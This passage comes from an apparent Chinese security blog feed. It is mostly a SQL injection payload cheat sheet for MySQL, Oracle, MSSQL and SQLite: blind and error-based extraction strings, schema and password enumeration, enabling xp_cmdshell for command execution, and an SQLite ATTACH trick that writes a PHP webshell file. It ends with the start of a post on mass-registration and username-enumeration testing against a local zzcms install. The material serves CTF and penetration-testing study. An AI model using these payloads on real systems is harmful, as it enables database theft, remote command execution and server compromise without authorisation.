<h3 id="1-3-5-Error-based-Double-Query-Injection"><a href="#1-3-5-Error-based-Double-Query-Injection" class="headerlink" title="1.3.5 Error based Double Query Injection"></a>1.3.5 Error based Double Query Injection</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1</span><br></pre></td></tr></table></figure>

<h3 id="1-3-6-exp-5-5-5以上"><a href="#1-3-6-exp-5-5-5以上" class="headerlink" title="1.3.6 exp(5.5.5以上)"></a>1.3.6 exp(5.5.5以上)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and (select exp(~(select * from(select user())x)))</span><br></pre></td></tr></table></figure>

<h2 id="1-4-BOOL盲注"><a href="#1-4-BOOL盲注" class="headerlink" title="1.4 BOOL盲注"></a>1.4 BOOL盲注</h2><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>
<h3 id="1-4-1-构造布尔条件"><a href="#1-4-1-构造布尔条件" class="headerlink" title="1.4.1 构造布尔条件"></a>1.4.1 构造布尔条件</h3><p>现在很多CTF比赛脑洞都出在了bool条件的构造，花式bool条件构造。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>正常情况</span><br><span class="line"><span class="string">&#x27;or bool#</span></span><br><span class="line"><span class="string">true&#x27;</span><span class="keyword">and</span> bool#</span><br><span class="line">    </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不使用空格、注释</span><br><span class="line"><span class="string">&#x27;or(bool)=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="literal">true</span><span class="string">&#x27;and(bool)=&#x27;</span><span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不使用<span class="keyword">or</span>、<span class="keyword">and</span>、注释</span><br><span class="line"><span class="string">&#x27;^!(bool)=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;=(bool)=&#x27;</span></span><br><span class="line"><span class="string">&#x27;||(bool)=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="literal">true</span><span class="string">&#x27;%26%26(bool)=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;=if((bool),1,0)=&#x27;</span><span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不使用等号、空格、注释</span><br><span class="line"><span class="string">&#x27;or(bool)&lt;&gt;&#x27;</span><span class="number">0</span></span><br><span class="line"><span class="string">&#x27;or((bool)in(1))or&#x27;</span><span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其他</span><br><span class="line"><span class="keyword">or</span> (<span class="keyword">case</span> <span class="keyword">when</span> (bool) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or (bool) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; and (bool) or 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-2-构造逻辑判断"><a href="#1-4-2-构造逻辑判断" class="headerlink" title="1.4.2 构造逻辑判断"></a>1.4.2 构造逻辑判断</h3><p>逻辑判断基本就那些函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">left</span>(<span class="keyword">user</span>(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;r&#x27;</span>  </span><br><span class="line"><span class="keyword">right</span>(<span class="keyword">user</span>(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;r&#x27;</span>  </span><br><span class="line">substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>  </span><br><span class="line">mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span> </span><br><span class="line">    </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>不使用逗号 </span><br><span class="line"><span class="keyword">user</span>() regexp <span class="string">&#x27;^[a-z]&#x27;</span></span><br><span class="line"><span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;root%&#x27;</span></span><br><span class="line"><span class="built_in">POSITION</span>(<span class="string">&#x27;root&#x27;</span> <span class="keyword">in</span> <span class="keyword">user</span>())</span><br><span class="line">mid(<span class="keyword">user</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span></span><br><span class="line">mid(<span class="keyword">user</span>() <span class="keyword">from</span> <span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>ASCII()</code>、<code>ORD()</code>和<code>CHAR()</code>函数一般用做辅助。</p>
<h3 id="1-4-3-利用order-by盲注"><a href="#1-4-3-利用order-by盲注" class="headerlink" title="1.4.3 利用order by盲注"></a>1.4.3 利用order by盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;5&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">5</span>                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> <span class="number">51</span>b7a76d51e70b419f60d3473fb6f900 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">    </span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;6&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> <span class="number">51</span>b7a76d51e70b419f60d3473fb6f900 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">6</span>                                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>

<p>这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。</p>
<h2 id="1-5-延时盲注"><a href="#1-5-延时盲注" class="headerlink" title="1.5 延时盲注"></a>1.5 延时盲注</h2><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。<br>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></p>
<p>两个函数：<br><code>BENCHMARK(100000,MD5(1)) or sleep(5)</code></p>
<p>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</p>
<h2 id="1-6-MySQL注释符："><a href="#1-6-MySQL注释符：" class="headerlink" title="1.6 MySQL注释符："></a>1.6 MySQL注释符：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="comment">-- -</span></span><br><span class="line"><span class="number">2.</span> <span class="comment">/* .... */</span></span><br><span class="line"><span class="number">3.</span> #</span><br><span class="line"><span class="number">4.</span> `</span><br><span class="line"><span class="number">5.</span> ;<span class="operator">%</span><span class="number">00</span> </span><br></pre></td></tr></table></figure>

<h2 id="1-7-Insert-amp-Update注入"><a href="#1-7-Insert-amp-Update注入" class="headerlink" title="1.7 Insert&amp;Update注入"></a>1.7 Insert&amp;Update注入</h2><p>insert和update一般使用报错注入<br><img src="https://ckcah.github.io/images/paylaod-sql/1.jpg"></p>
<p>如果没有错误回显，insert可以使用延时注入：<br><img src="https://ckcah.github.io/images/paylaod-sql/2.jpg"></p>
<p>update可以使用bool盲注和延时盲注。</p>
<h2 id="1-8-order-by后的注入"><a href="#1-8-order-by后的注入" class="headerlink" title="1.8 order by后的注入"></a>1.8 order by后的注入</h2><h3 id="1-8-1-报错注入"><a href="#1-8-1-报错注入" class="headerlink" title="1.8.1 报错注入"></a>1.8.1 报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and extractvalue(1, concat(0x7e, (select @@version),0x7e))</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/3.jpg">

<h3 id="1-8-2-bool盲注"><a href="#1-8-2-bool盲注" class="headerlink" title="1.8.2 bool盲注"></a>1.8.2 bool盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by IF((bool),1,(select 1 union select 2))</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/4.jpg">

<h3 id="1-8-3-延时盲注"><a href="#1-8-3-延时盲注" class="headerlink" title="1.8.3 延时盲注"></a>1.8.3 延时盲注</h3><p>不推荐，因为每条数据都会执行延时，<strong>能用其他方法就不使用延时</strong>。<br><code>order by IF(1,sleep(3),0);</code><br><img src="https://ckcah.github.io/images/paylaod-sql/5.jpg"><br>两条数据延时了6秒</p>
<h2 id="1-9-表名可控注入"><a href="#1-9-表名可控注入" class="headerlink" title="1.9 表名可控注入"></a>1.9 表名可控注入</h2><h3 id="1-9-1-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#1-9-1-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>1.9.1 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;use b2cshop&quot;</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line">mysql_query(<span class="string">&quot;desc `shop_<span class="subst">&#123;$table&#125;</span>`&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;DESC 出错:&quot;</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from shop_<span class="subst">&#123;$table&#125;</span> where 1=1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">&quot;<span class="subst">$sql</span>&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/6.jpg">
shop_users 后面的两个``,做了shop_users 表的别名,所以无影响。
这时候desc的语句为,

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">desc</span> `shop_users` `<span class="keyword">where</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x5e24</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5e24</span>),<span class="number">1</span>)#`</span><br></pre></td></tr></table></figure>

<h3 id="1-9-2-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#1-9-2-表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>1.9.2 表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;use b2cshop&quot;</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line">mysql_query(<span class="string">&quot;desc shop_<span class="subst">&#123;$table&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;DESC 出错:&quot;</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `shop_<span class="subst">&#123;$table&#125;</span>` where 1=1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">&quot;<span class="subst">$sql</span>&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/7.jpg">

<h2 id="1-10-无列明注入"><a href="#1-10-无列明注入" class="headerlink" title="1.10 无列明注入"></a>1.10 无列明注入</h2><h3 id="1-10-1-别名"><a href="#1-10-1-别名" class="headerlink" title="1.10.1 别名"></a>1.10.1 别名</h3><p><code>union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1</code><br><img src="https://ckcah.github.io/images/paylaod-sql/8.jpg"></p>
<p>或者<br><code>union (select 1,2,c from (select 1,2 as c union select * from flag) as b) limit 1,1</code><br><img src="https://ckcah.github.io/images/paylaod-sql/9.jpg"></p>
<h3 id="1-10-2-变量"><a href="#1-10-2-变量" class="headerlink" title="1.10.2 变量"></a>1.10.2 变量</h3><p>需要一个请求两个注入</p>
<img src="https://ckcah.github.io/images/paylaod-sql/10.jpg">

<h2 id="1-11-可报错时爆表名、字段名、库名"><a href="#1-11-可报错时爆表名、字段名、库名" class="headerlink" title="1.11 可报错时爆表名、字段名、库名"></a>1.11 可报错时爆表名、字段名、库名</h2><h3 id="1-11-1-字段名"><a href="#1-11-1-字段名" class="headerlink" title="1.11.1 字段名"></a>1.11.1 字段名</h3><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id=1 and (select * from (select * from admin as a join admin as b) as c)</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/11.jpg">

<p>把当前表第一个字段成功爆出来了。</p>
<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
<p>同时，可以利用using爆其他字段：</p>
<img src="https://ckcah.github.io/images/paylaod-sql/12.jpg">

<h3 id="1-11-2-表名"><a href="#1-11-2-表名" class="headerlink" title="1.11.2 表名"></a>1.11.2 表名</h3><p>翻阅mysql的文档发现了一个非常好玩的函数</p>
<p>Polygon(ls1, ls2, …)</p>
<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="https://ckcah.github.io/images/paylaod-sql/13.jpg"></p>
<h3 id="1-11-3-库名"><a href="#1-11-3-库名" class="headerlink" title="1.11.3 库名"></a>1.11.3 库名</h3><p>上面的方法已经可以爆出库名了，提供另一个方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where id =1-a()</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/14.jpg">

<h1 id="2-Oracle"><a href="#2-Oracle" class="headerlink" title="2 Oracle"></a>2 Oracle</h1><h2 id="2-1-常用信息及语句"><a href="#2-1-常用信息及语句" class="headerlink" title="2.1 常用信息及语句"></a>2.1 常用信息及语句</h2><p>注释符：<br><code>-- +</code></p>
<p>当前用户权限：<br><code>select * from session_roles</code></p>
<p>当前数据库版本：<br><code>select banner from sys.v_$version where rownum=1</code></p>
<p>服务器监听IP：<br><code>select utl_inaddr.get_host_address from dual</code></p>
<p>服务器操作系统：<br><code>select member from v$logfile where rownum=1</code></p>
<p>服务器sid：<br><code>select instance_name fromv$instance</code></p>
<p>当前连接用户：<br><code>select SYS_CONTEXT (&#39;USERENV&#39;, &#39;CURRENT_USER&#39;)from dual</code></p>
<p>获取数据库名：<br><code>select owner from all_tables where rownum=1</code><br>依次爆出所有数据库名，假设第一个库名为<code>first_dbname</code>哪个第二个库<code>select owner from all_tables where rownum=1 and owner&lt;&gt;&#39;first_dbname&#39;</code>依次类推</p>
<p>获取表名：<br><code>select table_name from user_tables where rownum=1</code>，依次爆出所有表类似暴库。</p>
<p>获取字段名：<br><code>select column_name from user_tab_columns where table_name=&#39;tablename&#39; and rownum=1</code>，依次爆出所有字段类似暴库。</p>
<h2 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND 2=UTL_INADDR.GET_HOST_ADDRESS(CHR(126)|(SLQ语句)|CHR(126))</span><br></pre></td></tr></table></figure>

<h2 id="2-3-踩的一些坑"><a href="#2-3-踩的一些坑" class="headerlink" title="2.3 踩的一些坑"></a>2.3 踩的一些坑</h2><p>Oracle比较玄学，能用SQLmap绝不手工，但测试中总会遇到必须用手工的，比如xml中的一个参数注入(当然也可以写tamper脚本)，总结一下自己踩到的坑。</p>
<h3 id="2-3-1-UNION每个字段类型必须相同"><a href="#2-3-1-UNION每个字段类型必须相同" class="headerlink" title="2.3.1 UNION每个字段类型必须相同"></a>2.3.1 UNION每个字段类型必须相同</h3><p>比如，原先的语句是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,&#x27;2&#x27;,&#x27;3&#x27; from dual</span><br></pre></td></tr></table></figure>

<p>那么后面的UNION也必须是<code>int,char,char</code>才行。</p>
<p>可以通过下面方法确定各个字段的类型。<br><code>and 1=2 union select &#39;null&#39;,null,null,null,null,null from dual</code><br>如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用’null’，数字型的就直接null</p>
<h3 id="2-3-2-必须跟FROM"><a href="#2-3-2-必须跟FROM" class="headerlink" title="2.3.2 必须跟FROM"></a>2.3.2 必须跟FROM</h3><p>Oracle的每个查询必须跟from，Oracle本身有个虚拟表dual，测试的时候可以使用。</p>
<h1 id="3-MSSQL"><a href="#3-MSSQL" class="headerlink" title="3 MSSQL"></a>3 MSSQL</h1><p>SQLserver也有点玄学，每个版本的系统内置表不一样，测试的时候很蛋疼。并且SQLserver的使用者参差不齐，网上回答很乱，有时间自己装上各个版本再专门总结。</p>
<h2 id="3-1-常用信息及语句"><a href="#3-1-常用信息及语句" class="headerlink" title="3.1 常用信息及语句"></a>3.1 常用信息及语句</h2><p>数据库版本：<br><code>select @@VERSION</code></p>
<p>数据库名：<br><code>select db_name()</code></p>
<p>数据库ip地址：<br><code>select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</code></p>
<p>暴当前表中的列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">article.asp?id=6 group by admin.username having 1=1--</span><br><span class="line">article.asp?id=6 group by admin.username,admin.password having 1=1--</span><br></pre></td></tr></table></figure>

<p>暴任意表和列：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1</span><br><span class="line">and (select top col_name(object_id(&#x27;admin&#x27;),N) from sysobjects)&gt;1</span><br></pre></td></tr></table></figure>

<p>暴数据库数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select top 1 password from admin where id=N)&gt;1</span><br></pre></td></tr></table></figure>

<h2 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h2><p>MSSQL一般使用类型转换导致的报错注入</p>
<img src="https://ckcah.github.io/images/paylaod-sql/15.jpg">

<h2 id="3-3-执行命令"><a href="#3-3-执行命令" class="headerlink" title="3.3 执行命令"></a>3.3 执行命令</h2><p><code>;declare @d int</code> //是否支持多行</p>
<p>如果支持多行语句执行并且是sa权限可以直接执行系统命令。</p>
<p>开启xp_cmdshell:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure<span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE; </span><br></pre></td></tr></table></figure>

<p>关闭xp_cmdshell:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure<span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>

<p>执行命令格式：<br><code>xp_cmdsehll(&#39;whoami&#39;);</code></p>
<h1 id="4-SQLite"><a href="#4-SQLite" class="headerlink" title="4 SQLite"></a>4 SQLite</h1><h2 id="4-1-常用信息及语句"><a href="#4-1-常用信息及语句" class="headerlink" title="4.1 常用信息及语句"></a>4.1 常用信息及语句</h2><p>数据库版本：<br><code>select sqlite_version()</code></p>
<p>获取所有表名：<br><code>SELECT name FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
<p>所有表结构(包含字段名，表名)：<br><code>SELECT sql FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
<p>注释符：<br><code>--</code></p>
<p>盲注常用函数：<code>substr()</code>（没有mid、left等函数），判断长度函数<code>length()</code></p>
<h2 id="4-2-BOOL盲注"><a href="#4-2-BOOL盲注" class="headerlink" title="4.2 BOOL盲注"></a>4.2 BOOL盲注</h2><p>bool条件构造和MySQL一样，但是亦或运算的paylaod不可用，注释符使用<code>--</code>。</p>
<p>逻辑判断目前我就翻到一个<code>substr()</code>，应用实例：<br><code>cond=&#39;FALSE&#39; or (substr(&#39;abc&#39;,1,1)=&#39;a&#39;)</code></p>
<h2 id="4-3-延时盲注"><a href="#4-3-延时盲注" class="headerlink" title="4.3 延时盲注"></a>4.3 延时盲注</h2><p>sqlite没有类似<code>sleep()</code>的函数，但有个函数<code>randomblob(N)</code>，生成N个任意字符，可以造成延时。</p>
<p>SQLite没有<code>if</code>，可以使用<code>case when ... then ...</code></p>
<p>格式<code>cond=&#39;true&#39; AND 1=(case when (bool) then randomblob(100000000) else 0 end)</code><br>100000000个字符就有明显延时了。</p>
<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次<code>randomblob(100000000)</code>，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 <code>id=&#39;&#39; or 1 AND 1=randomblob(1000000)</code>这样，把N的值缩小100倍。灵活运用。</p>
<p>运用实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1 and 1=(case when substr(&#x27;abc&#x27;,1,1)=&#x27;a&#x27; then randomblob(1000000) else 0 end)--</span><br></pre></td></tr></table></figure>

<h2 id="4-4-写文件"><a href="#4-4-写文件" class="headerlink" title="4.4 写文件"></a>4.4 写文件</h2><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;ATTACH DATABASE &#x27;/tmp/p0.php&#x27; AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES (&#x27;&#x27;);--</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/paylaod-sql/16.jpg">

<img src="https://ckcah.github.io/images/paylaod-sql/17.jpg">

<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
<h2 id="4-5-读文件"><a href="#4-5-读文件" class="headerlink" title="4.5 读文件"></a>4.5 读文件</h2><p>只能用在Windows上，需要特殊配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>paylaod</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞学习一</title>
    <url>/2020/05/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    <content><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>涉及sql注入、xss、RCE</p>
<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>在虚拟机中搭建了一个zzcms8.1，之前原本想用DC_1来测试来，但尝试了一下用户注册，发现必须要管理员同意才算注册成功，就想着先找个简单的下手，这里先留个坑，之后再去填吧。</p>
<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>挖掘一个站时，大概思路就是：</p>
<p>确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题</p>
<p>拿到一个站后，第一步可以看看，但真正的第一步，是注册，就业务逻辑漏洞来说，我个人的理解，就是因为逻辑程序不严谨或逻辑太过复杂，才导致了一些逻辑分支不能正常处理</p>
<p>逻辑分布主要分布在用户身份、业务一致性、用户信息方面。今天就尝试一下用户身份，关于注册和密码找回</p>
<h2 id="恶意用户批量注册"><a href="#恶意用户批量注册" class="headerlink" title="恶意用户批量注册"></a>恶意用户批量注册</h2><p>先随意注册一个</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/1.png">

<p>成功登录</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/2.png">

<p>既然摸清了注册套路，直接抓包</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/3.png">

<p>然后直接将username更改为其他名字，进行提交尝试</p>
<p><img src="https://ckcah.github.io/images/逻辑漏洞学习-1/4.png">提交</p>
<p>然后尝试用test4登录，成功</p>
<img src="https://ckcah.github.io/images/逻辑漏洞学习-1/5.png">



<p>那反正意思就是，图形验证码是无效的，并且未对电话，联系人，邮箱等信息校验嘛，那就ok啊，用burp字典跑，批量注册跑不掉的。</p>
<h2 id="批量用户名猜解"><a href="#批量用户名猜解" class="headerlink" title="批量用户名猜解"></a>批量用户名猜解</h2><p>再注册了test以后，又接着尝试再注册一个test，发现它有用户名已存在的提示</p>
